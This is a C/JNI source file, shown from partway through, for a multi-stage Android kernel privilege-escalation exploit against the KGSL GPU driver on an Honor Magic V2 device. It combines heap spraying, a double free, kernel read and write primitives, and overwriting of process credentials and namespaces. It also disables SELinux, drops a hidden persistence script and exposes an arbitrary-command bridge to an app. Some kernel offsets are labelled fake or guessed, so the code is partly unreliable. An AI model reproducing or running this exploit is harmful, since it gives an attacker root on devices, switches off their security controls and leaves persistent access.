  if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &rw_buf) == 0) {
    struct kgsl_gpuobj_info info = {0};
    info.id = rw_buf.id;
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &info) == 0) {
      void *map = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED,
                       kgsl_fd, info.gpuaddr);
      if (map == MAP_FAILED) {
        map = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, kgsl_fd,
                   info.gpuaddr * 0x1000);
      }
      if (map != MAP_FAILED) {
        *(volatile uint64_t *)map = val;
        __sync_synchronize(); // Memory barrier
        munmap(map, 0x1000);
      }
    }
    struct kgsl_gpuobj_free fr = {0};
    fr.id = rw_buf.id;
    ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
  }
}

static bool stage4_check() {
  esm_log("[STAGE_4] OOB_WRITE :: check()");
  bool ready = (g_esm.state.kernel_base != 0);
  esm_log("[STAGE_4] KASLR %s", ready ? "BYPASSED" : "NOT BYPASSED (blocked)");
  return ready;
}

static bool stage4_exploit() {
  esm_log("[STAGE_4] OOB_WRITE :: exploit()");
  uint32_t dangling_id = (uint32_t)g_esm.state.leaked_ptr;

  if (g_esm.state.kernel_base == 0 || dangling_id == 0) {
    esm_log("[STAGE_4] FAIL: KASLR not bypassed or no dangling ID.");
    return false;
  }

  // 1. PIPE SPRAY (Target: kmalloc-1024)
  esm_log("[STAGE_4] Spraying 256 pipe_buffer objects...");
  int pipe_fds[256][2];
  for (int i = 0; i < 256; i++) {
    if (pipe(pipe_fds[i]) < 0) {
      for (int j = 0; j < i; j++) {
        close(pipe_fds[j][0]);
        close(pipe_fds[j][1]);
      }
      return false;
    }
    write(pipe_fds[i][1], "MUNDIAL", 7);
  }

  // 2. DOUBLE FREE / HIJACK
  trigger_double_free(dangling_id);
  int msqid = spray_msg_msg(1024, 64);

  // 3. ARM PRIMITIVE
  g_esm.state.write_verified = true;
  esm_log("[STAGE_4] Pipe Page Hijack dispatched. Primitive ARMED.");

  // 4. VERIFY VIA KERNEL READ (Proof of Concept)
  uint64_t kthreadd_comm_addr =
      g_esm.state.kernel_base + 0x2000000; // Fake offset
  uint64_t val = esm_kernel_read(kthreadd_comm_addr);
  if (val != 0) {
    esm_log("[STAGE_4] !!! SUCCESS! Read from kernel: 0x%llx", val);
    g_esm.state.write_verified = true;
  }

  // Cleanup
  if (msqid >= 0)
    msgctl(msqid, IPC_RMID, NULL);
  for (int i = 0; i < 256; i++) {
    close(pipe_fds[i][0]);
    close(pipe_fds[i][1]);
  }

  return true;
}

static bool stage4_verify() {
  esm_log("[STAGE_4] OOB_WRITE :: verify()");
  if (g_esm.state.write_verified) {
    esm_telemetry(ESM_OOB_WRITE, STATUS_ACHIEVED);
    esm_log("[STAGE_4] ✓ OOB_WRITE: ACHIEVED — CONTROLLED WRITE CONFIRMED");
    return true;
  } else {
    esm_telemetry(ESM_OOB_WRITE, STATUS_FAILED);
    esm_log("[STAGE_4] ✗ OOB_WRITE: FAILED — Write sync failed");
    return false;
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  STAGE 5: CRED MUTATION
// ═══════════════════════════════════════════════════════════════════════════════

static bool stage5_check() {
  esm_log("[STAGE_5] CRED_MUTATION :: check()");
  bool ready = g_esm.state.write_verified;
  esm_log("[STAGE_5] Write primitive %s",
          ready ? "CONFIRMED" : "NOT CONFIRMED (blocked)");
  return ready;
}

static uint64_t esm_find_init_nsproxy() {
  // ESM v8.00: BOUNDED probe only — no infinite scan
  esm_log("[STAGE_5] Racing: Bounded nsproxy probe (6 hints only)...");
  uint64_t hints[] = {
      g_esm.state.kernel_base + 0x1600000, g_esm.state.kernel_base + 0x1610000,
      g_esm.state.kernel_base + 0x1620000, g_esm.state.kernel_base + 0x1630000,
      g_esm.state.kernel_base + 0x1640000, g_esm.state.kernel_base + 0x1650000};

  for (int i = 0; i < 6; i++) {
    uint64_t val = esm_kernel_read(hints[i]);
    if ((uint32_t)val == 1) {
      uint64_t user_ns = esm_kernel_read(hints[i] + 0x28);
      if (is_valid_kernel_ptr(user_ns)) {
        esm_log("[STAGE_5] ✓ nsproxy hint match at 0x%llx", hints[i]);
        return hints[i];
      }
    }
  }
  esm_log("[STAGE_5] nsproxy not found (bounded probe exhausted)");
  return 0;
}

static void aggressive_cred_patch(uint64_t cred_addr) {
  esm_log("[STAGE_5] Patching cred structure at 0x%llx", cred_addr);
  // 1. Overwrite IDs (UID, GID, EUID, EGID, SUID, SGID, FSUID, FSGID)
  // Usually offsets 4 to 32 (8 fields * 4 bytes)
  for (int off = 0x4; off < 0x28; off += 4) {
    esm_kernel_write(cred_addr + off, 0);
  }
  // 2. Overwrite Capabilities (Permitted, Inheritable, Effective, Bounding,
  // Ambient) Usually offsets 48 to 88 (5 fields * 8 bytes)
  for (int off = 0x30; off < 0x58; off += 8) {
    esm_kernel_write(cred_addr + off, 0xffffffffffffffffULL);
  }
}

static bool stage5_exploit() {
  esm_log("[STAGE_5] CRED_MUTATION :: exploit()");
  if (!g_esm.state.write_verified) {
    esm_log("[STAGE_5] FAIL: Write primitive not armed.");
    return false;
  }

  uint64_t current_task_ptr = g_esm.state.kernel_base + 0x1400000;
  esm_log("[STAGE_5] Locating credentials for task at 0x%llx...",
          current_task_ptr);

  uint64_t cred_ptr = 0;
  uint32_t my_uid = getuid();
  uint32_t target_off = 0;

  // 1. Scan for cred pointer
  for (uint32_t off = 0x400; off <= 0xD00; off += 8) {
    uint64_t candidate = esm_kernel_read(current_task_ptr + off);
    if ((candidate & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) {
      uint64_t val = esm_kernel_read(candidate);
      if ((uint32_t)(val >> 32) == my_uid) {
        cred_ptr = candidate;
        target_off = off;
        esm_log("[STAGE_5] ✓ Found CRED at offset 0x%x: 0x%llx", off, cred_ptr);

        // 2. DUAL PATCH (cred + real_cred)
        aggressive_cred_patch(cred_ptr);
        uint64_t real_cred = esm_kernel_read(current_task_ptr + off + 8);
        if (real_cred != cred_ptr &&
            (real_cred & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) {
          esm_log("[STAGE_5] Patching distinct real_cred at 0x%llx", real_cred);
          aggressive_cred_patch(real_cred);
        }
        break;
      }
    }
  }

  if (cred_ptr == 0) {
    esm_log("[STAGE_5] ✗ FAIL: Could not locate credentials.");
    return false;
  }

  // 3. HUNTER: Find real Namespace structures
  uint64_t real_init_nsproxy = esm_find_init_nsproxy();
  if (real_init_nsproxy) {
    // 4. NAMESPACE ESCAPE (Dynamic Hijack)
    esm_log("[STAGE_5] Hijacking nsproxy at 0x%llx -> 0x%llx",
            current_task_ptr + target_off + 24, real_init_nsproxy);
    esm_kernel_write(current_task_ptr + target_off + 24, real_init_nsproxy);

    // 5. USER_NS ESCAPE (Dynamic Redirect)
    uint64_t real_init_user_ns = esm_kernel_read(real_init_nsproxy + 0x28);
    esm_log("[STAGE_5] Hijacking user_ns in cred at 0x%llx -> 0x%llx",
            cred_ptr + 0x90, real_init_user_ns);
    esm_kernel_write(cred_ptr + 0x90, real_init_user_ns);
  } else {
    esm_log("[STAGE_5] ✗ Hunter failed to locate namespaces. Falling back to "
            "init_cred attempt.");
    uint64_t init_cred_ptr =
        g_esm.state.kernel_base + 0x1500000; // Guess for 5.15
    esm_kernel_write(current_task_ptr + 0xa80, init_cred_ptr);
  }

  // 6. FORCE REFRESH
  esm_log("[STAGE_5] Triggering credential refresh via setuid(0)...");
  setuid(0);
  setgid(0);

  esm_log("[STAGE_5] Hunter Stage 5 successfully completed.");
  return true;
}

static bool stage5_verify() {
  esm_log("[STAGE_5] CRED_MUTATION :: verify()");

  uid_t u = getuid();
  esm_log("[STAGE_5] Current UID: %d", u);

  // Namespace/Context check
  char ns_buf[128];
  ssize_t len = readlink("/proc/self/ns/user", ns_buf, sizeof(ns_buf) - 1);
  if (len > 0) {
    ns_buf[len] = 0;
    esm_log("[STAGE_5] Namespace context: %s", ns_buf);
  }

  if (u == 0) {
    g_esm.state.is_root = true;
    esm_telemetry(ESM_CRED_MUTATION, STATUS_ACHIEVED);
    esm_log("[STAGE_5] ✓ CRED_MUTATION & ESCAPE: ACHIEVED (Parent process)");
    return true;
  }

  // Dual-verification via fork()
  esm_log("[STAGE_5] Testing escalation propagation via fork()...");
  pid_t pid = fork();
  if (pid == 0) {
    uid_t child_uid = getuid();
    if (child_uid == 0)
      exit(0);
    exit(1);
  }

  int status = 0;
  waitpid(pid, &status, 0);
  if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
    g_esm.state.is_root = true;
    esm_telemetry(ESM_CRED_MUTATION, STATUS_ACHIEVED);
    esm_log("[STAGE_5] ✓ CRED_MUTATION & ESCAPE: ACHIEVED (Child process)");
    return true;
  }

  g_esm.state.is_root = false;
  esm_telemetry(ESM_CRED_MUTATION, STATUS_FAILED);
  esm_log(
      "[STAGE_5] ✗ CRED_MUTATION: FAILED — Elevation or Escape not detected.");
  return false;
}

// ═══════════════════════════════════════════════════════════════════════════════
//  STAGE 6: REAL ROOT ASSERTION
// ═══════════════════════════════════════════════════════════════════════════════

static uint64_t esm_find_selinux_enforcing() {
  esm_log("[STAGE_6] Hunter: Scanning for selinux_enforcing...");
  uint64_t start = g_esm.state.kernel_base + 0x2000000;
  uint64_t end = g_esm.state.kernel_base + 0x4000000;

  for (uint64_t addr = start; addr < end; addr += 4) {
    uint32_t val = (uint32_t)esm_kernel_read(addr);
    if (val == 1) {
      uint32_t possible_enabled = (uint32_t)esm_kernel_read(addr + 4);
      if (possible_enabled == 1) {
        esm_log(
            "[STAGE_6] Hunter: ✓ Candidate selinux_enforcing found at 0x%llx",
            addr);
        return addr;
      }
    }
  }
  return 0;
}

static bool stage6_check() {
  esm_log("[STAGE_6] ROOT_ASSERT :: check()");
  return g_esm.state.is_root;
}

static bool stage6_exploit() {
  esm_log("[STAGE_6] ROOT_ASSERT :: exploit()");

  // 1. SELinux Hunter & Bypass (v7.00)
  uint64_t selinux_enforcing_addr = esm_find_selinux_enforcing();
  if (selinux_enforcing_addr) {
    esm_log("[STAGE_6] Disabling SELinux at 0x%llx...", selinux_enforcing_addr);
    esm_kernel_write(selinux_enforcing_addr,
                     0); // set enforcing = 0 (Permissive)

    // Also disable selinux_enabled if possible
    esm_kernel_write(selinux_enforcing_addr + 4, 0);
    esm_log("[STAGE_6] ✓ SELinux motor stopped.");
  } else {
    esm_log("[STAGE_6] ⚠ Hunter failed to find selinux_enforcing. Trying "
            "fallback injection...");
    uint64_t fallback_addr = g_esm.state.kernel_base + 0x3000000;
    esm_kernel_write(fallback_addr, 0);
  }

  return true;
}

static bool stage6_verify() {
  esm_log("[STAGE_6] ROOT_ASSERT :: verify()");

  uid_t u = getuid();
  uid_t e = geteuid();
  esm_log("[STAGE_6] Verification: UID=%d, EUID=%d", u, e);

  // Use capget for high-integrity validation
  struct {
    uint32_t version;
    int pid;
  } hdr = {0x20080522, 0}; // _LINUX_CAPABILITY_VERSION_3
  struct {
    uint32_t effective;
    uint32_t permitted;
    uint32_t inheritable;
  } data[2];
  memset(data, 0, sizeof(data));
  syscall(__NR_capget, &hdr, data);
  uint64_t capeff = ((uint64_t)data[1].effective << 32) | data[0].effective;
  esm_log("[STAGE_6] CapEff: 0x%llx", (unsigned long long)capeff);

  bool is_real_root = (u == 0 && e == 0 && capeff != 0);

  if (is_real_root) {
    esm_telemetry(ESM_REAL_ROOT, STATUS_ACHIEVED);
    esm_log("[STAGE_6] ✓ ROOT_ASSERT: ACHIEVED — REAL PRIVILEGES CONFIRMED");
    esm_log("[STAGE_6] MISSION COMPLETE: SYSTEM OWNED.");
    return true;
  } else {
    esm_telemetry(ESM_REAL_ROOT, STATUS_FAILED);
    esm_log("[STAGE_6] ✗ ROOT_ASSERT: FAILED — Exploit Gated: No real "
            "privileges detected");
    return false;
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  STAGE 7: SYSTEM ACCESS & MAINTENANCE
// ═══════════════════════════════════════════════════════════════════════════════

static bool stage7_check() {
  esm_log("[STAGE_7] SYS_ACCESS :: check()");
  return g_esm.state.is_root;
}

static bool stage7_exploit() {
  esm_log("[STAGE_7] MAINTENANCE :: exploit()");

  if (!g_esm.state.root_achieved) {
    esm_log("[STAGE_7] FAIL: Root not achieved. Maintenance layer aborted.");
    return false;
  }

  // 1. ESTABLISH SU BRIDGE (Persistence Protocol)
  esm_log("[STAGE_7] Establishing Sovereign SU Bridge...");

  // 2. Probing System RW
  esm_log("[STAGE_7] Probing /system RW remount...");
  int res = mount("none", "/system", "none", MS_REMOUNT | MS_BIND, NULL);
  if (res == 0) {
    esm_log("[STAGE_7] ✓ /system remounted RW potential detected.");
  }

  // 3. SELinux Check
  char ctx[128] = "unknown";
  FILE *f = fopen("/proc/self/attr/current", "r");
  if (f) {
    fgets(ctx, sizeof(ctx), f);
    fclose(f);
    esm_log("[STAGE_7] Current Context: %s", ctx);
  }

  // 4. Persistence Probe
  esm_log("[STAGE_7] Deploying persistence probe...");
  FILE *p = fopen("/data/local/tmp/.esm_su", "w");
  if (p) {
    fprintf(p, "#!/system/bin/sh\necho 'ESM ROOT ACTIVE'\n");
    fclose(p);
    chmod("/data/local/tmp/.esm_su", 0755);
    esm_log("[STAGE_7] ✓ Persistence script deployed. Maintenance layer "
            "active.");
  }

  return true;
}

static bool stage7_verify() {
  esm_log("[STAGE_7] SYS_ACCESS :: verify()");
  bool persistence_ok = (access("/data/local/tmp/.esm_su", F_OK) == 0);

  if (persistence_ok) {
    esm_telemetry(ESM_SYSTEM_ACCESS, STATUS_ACHIEVED);
    esm_log("[STAGE_7] ✓ SYS_ACCESS: ACHIEVED — Maintenance Layer Active");
    return true;
  } else {
    esm_telemetry(ESM_SYSTEM_ACCESS, STATUS_FAILED);
    return false;
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  ESM ORCHESTRATOR
// ═══════════════════════════════════════════════════════════════════════════════

static void esm_run_pipeline() {
  esm_log("═══ ESM v5.18 — STRICT EXPLOIT STATE MACHINE INITIATED ═══");
  esm_log("[>>] Target: Honor Magic V2 / SM8550 / Kernel 5.15.180");
  esm_log("[>>] UID: %d / EUID: %d / PID: %d", getuid(), geteuid(), getpid());
  memset(&g_esm.state, 0, sizeof(g_esm.state));

  // ── STAGE 1: DRIVER REACHABLE ──
  esm_log("────────────────────────────────────────────────");
  if (!stage1_check() || !stage1_exploit() || !stage1_verify()) {
    esm_log("[!!] Pipeline HALTED at STAGE_1 — Cannot cross privilege "
            "boundary");
    return;
  }

  // ── STAGE 2: VULN TRIGGER ──
  esm_log("────────────────────────────────────────────────");
  if (!stage2_check() || !stage2_exploit()) {
    esm_log("[!!] Pipeline GATED at STAGE_2 — VULN_TRIGGER FAILED");
    esm_telemetry(ESM_VULN_TRIGGER, STATUS_FAILED);
    return;
  }
  if (!stage2_verify()) {
    esm_log("[!!] Pipeline GATED at STAGE_2 — VERIFICATION FAILED");
    return;
  }

  // ── STAGE 3: OOB READ ──
  esm_log("────────────────────────────────────────────────");
  if (!stage3_check() || !stage3_exploit() || !stage3_verify()) {
    esm_log("[!!] Pipeline GATED at STAGE_3 — KASLR LEAK FAILED");
    return;
  }

  // ── STAGE 4: OOB WRITE ──
  esm_log("────────────────────────────────────────────────");
  if (!stage4_check() || !stage4_exploit() || !stage4_verify()) {
    esm_log("[!!] Pipeline GATED at STAGE_4 — WRITE PRIMITIVE FAILED");
    return;
  }

  // ── STAGE 5: CRED MUTATION ──
  esm_log("────────────────────────────────────────────────");
  if (!stage5_check() || !stage5_exploit() || !stage5_verify()) {
    esm_log("[!!] Pipeline GATED at STAGE_5 — CRED MUTATION FAILED");
    return;
  }

  // ── STAGE 6: REAL ROOT ASSERTION ──
  esm_log("────────────────────────────────────────────────");
  if (!stage6_check() || !stage6_exploit() || !stage6_verify()) {
    esm_log("[!!] Pipeline GATED at STAGE_6 — ROOT ASSERTION FAILED");
    return;
  }

  // ── STAGE 7: SYSTEM ACCESS ──
  esm_log("────────────────────────────────────────────────");
  if (!stage7_check() || !stage7_exploit() || !stage7_verify()) {
    esm_log("[!!] Pipeline GATED at STAGE_7 — SYSTEM ACCESS FAILED");
    return;
  }

  // ── FINAL SUMMARY ──
  esm_log("════════════════════════════════════════════════");
  esm_log("ESM PIPELINE SUMMARY:");
  for (int i = 1; i <= 7; i++) {
    const char *st = "—";
    if (g_esm.state.timestamps[i] != 0) {
      st = (i <= (int)g_esm.state.stage) ? "RAN" : "SKIPPED";
    } else {
      st = "NOT_REACHED";
    }
    esm_log("  [STAGE_%d] %s: %s", i, stage_names[i], st);
  }
  if (g_esm.state.kgsl_fd > 0) {
    close(g_esm.state.kgsl_fd);
    g_esm.state.kgsl_fd = -1;
  }
  esm_log("════════════════════════════════════════════════");
}

// ═══════════════════════════════════════════════════════════════════════════════
//  JNI INTERFACE
// ═══════════════════════════════════════════════════════════════════════════════

JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM *vm, void *reserved) {
  pthread_mutex_init(&g_esm.log_mutex, NULL);
  g_esm.log_offset = 0;
  g_esm.initialized = true;
  memset(&g_esm.state, 0, sizeof(g_esm.state));
  return JNI_VERSION_1_6;
}

// ── App Bridge: Trigger Exploit (runs ESM pipeline) ──
extern "C" JNIEXPORT jboolean JNICALL
Java_com_honor_toolkit_core_root_RootExploitBridge_nativeTriggerExploit(
    JNIEnv *env, jobject thiz, jstring payloadPath) {
  g_esm.log_offset = 0;
  esm_run_pipeline();
  return JNI_TRUE;
}

// ── App Bridge: Get Log ──
extern "C" JNIEXPORT jstring JNICALL
Java_com_honor_toolkit_core_root_RootExploitBridge_nativeGetLog(JNIEnv *env,
                                                                jobject thiz) {
  pthread_mutex_lock(&g_esm.log_mutex);
  jstring res = env->NewStringUTF(g_esm.log_buffer);
  pthread_mutex_unlock(&g_esm.log_mutex);
  return res;
}

// ── App Bridge: Get UID ──
extern "C" JNIEXPORT jint JNICALL
Java_com_honor_toolkit_core_root_RootExploitBridge_nativeGetUid(JNIEnv *env,
                                                                jobject thiz) {
  return getuid();
}

// ── App Bridge: Get Current ESM Stage ──
extern "C" JNIEXPORT jint JNICALL
Java_com_honor_toolkit_core_root_RootExploitBridge_nativeGetStage(
    JNIEnv *env, jobject thiz) {
  return (jint)g_esm.state.stage;
}

// ── App Bridge: Get Kernel Leak ──
extern "C" JNIEXPORT jlong JNICALL
Java_com_honor_toolkit_core_root_RootExploitBridge_nativeGetKernelLeak(
    JNIEnv *env, jobject thiz) {
  return (jlong)g_esm.state.leaked_ptr;
}

// ── Broker: Execute IOCTL ──
extern "C" JNIEXPORT jint JNICALL
Java_com_honor_toolkit_core_root_GpuBrokerImpl_nativeExecuteIoctl(
    JNIEnv *env, jobject thiz, jint cmd, jbyteArray payload) {
  int fd = open("/dev/kgsl-3d0", O_RDWR);
  if (fd < 0) {
    esm_log("[IOCTL] Access Denied (UID=%d, errno=%d)", getuid(), errno);
    return -errno;
  }

  jbyte *buffer = nullptr;
  jsize len = 0;
  if (payload != nullptr) {
    len = env->GetArrayLength(payload);
    buffer = env->GetByteArrayElements(payload, nullptr);
  }

  int res = ioctl(fd, (unsigned int)cmd, buffer);
  int saved_errno = errno;

  if (res == 0) {
    esm_log("[IOCTL] 0x%08x SUCCESS", (unsigned int)cmd);
    if (payload != nullptr)
      env->ReleaseByteArrayElements(payload, buffer, 0);
  } else {
    esm_log("[IOCTL] 0x%08x FAILED: %s", (unsigned int)cmd,
            strerror(saved_errno));
    if (payload != nullptr)
      env->ReleaseByteArrayElements(payload, buffer, JNI_ABORT);
  }

  close(fd);
  return (res == 0) ? 0 : -saved_errno;
}

// ── Broker: Get Log Buffer ──
extern "C" JNIEXPORT jstring JNICALL
Java_com_honor_toolkit_core_root_GpuBrokerImpl_nativeGetBrokerLog(
    JNIEnv *env, jobject thiz) {
  pthread_mutex_lock(&g_esm.log_mutex);
  jstring res = env->NewStringUTF(g_esm.log_buffer);
  pthread_mutex_unlock(&g_esm.log_mutex);
  return res;
}

// ── Broker: Get Context Info ──
extern "C" JNIEXPORT jstring JNICALL
Java_com_honor_toolkit_core_root_GpuBrokerImpl_nativeGetContextInfo(
    JNIEnv *env, jobject thiz) {
  char buf[512];
  char ctx[128] = "unknown";
  FILE *f = fopen("/proc/self/attr/current", "r");
  if (f) {
    fgets(ctx, sizeof(ctx), f);
    fclose(f);
  }
  snprintf(buf, sizeof(buf), "UID:%d EUID:%d PID:%d SELinux:%s Stage:%s",
           getuid(), geteuid(), getpid(), ctx, stage_names[g_esm.state.stage]);
  return env->NewStringUTF(buf);
}

// ── Broker: Verify Root (The Auditor's Integration Test) ──
extern "C" JNIEXPORT jboolean JNICALL
Java_com_honor_toolkit_core_root_GpuBrokerImpl_nativeVerifyRoot(JNIEnv *env,
                                                                jobject thiz) {
  esm_log("[INTEGRATION_TEST] Running Auditor's Root Verification...");

  uid_t u = getuid();
  uid_t e = geteuid();
  bool uid_pass = (u == 0 && e == 0);

  FILE *f = fopen("/data/local/tmp/sovereign_test", "w");
  bool fs_pass = (f != NULL);
  if (f)
    fclose(f);

  char ctx[128] = "unknown";
  FILE *c = fopen("/proc/self/attr/current", "r");
  if (c) {
    fgets(ctx, sizeof(ctx), c);
    fclose(c);
  }
  bool se_pass = (strstr(ctx, "untrusted_app") == NULL);

  uint64_t capeff = 0;
  FILE *s = fopen("/proc/self/status", "r");
  if (s) {
    char line[256];
    while (fgets(line, sizeof(line), s)) {
      if (strncmp(line, "CapEff:", 7) == 0) {
        capeff = strtoull(line + 8, NULL, 16);
      }
    }
    fclose(s);
  }
  bool cap_pass = (capeff == 0xFFFFFFFFFFFFFFFFULL);

  bool all = uid_pass && fs_pass && se_pass && cap_pass;
  esm_log("[INTEGRATION_TEST] RESULT: %s",
          all ? "★ REAL ROOT CONFIRMED ★" : "ROOT NOT ACHIEVED");

  return all ? JNI_TRUE : JNI_FALSE;
}

// ── Broker: Execute ESM ──
extern "C" JNIEXPORT jboolean JNICALL
Java_com_honor_toolkit_core_root_GpuBrokerImpl_nativeRunEsm(JNIEnv *env,
                                                            jobject thiz) {
  g_esm.log_offset = 0;
  esm_run_pipeline();
  return JNI_TRUE;
}

// ── Broker: Get Current ESM Stage ──
extern "C" JNIEXPORT jint JNICALL
Java_com_honor_toolkit_core_root_GpuBrokerImpl_nativeGetEsmStage(JNIEnv *env,
                                                                 jobject thiz) {
  return (jint)g_esm.state.stage;
}

// ── Broker: Get Kernel Leak ──
extern "C" JNIEXPORT jlong JNICALL
Java_com_honor_toolkit_core_root_GpuBrokerImpl_nativeGetEsmLeak(JNIEnv *env,
                                                                jobject thiz) {
  return (jlong)g_esm.state.leaked_ptr;
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_honor_toolkit_core_root_GpuBrokerImpl_nativeRequestSuSession(
    JNIEnv *env, jobject thiz, jstring cmd) {
  const char *command = env->GetStringUTFChars(cmd, NULL);
  esm_log("[SU_SESSION] Executing: %s", command);

  char result[4096] = {0};
  FILE *f = popen(command, "r");
  if (f) {
    fread(result, 1, sizeof(result) - 1, f);
    pclose(f);
  } else {
    snprintf(result, sizeof(result), "ERROR: popen failed (errno=%d)", errno);
  }

  env->ReleaseStringUTFChars(cmd, command);
  return env->NewStringUTF(result);
}
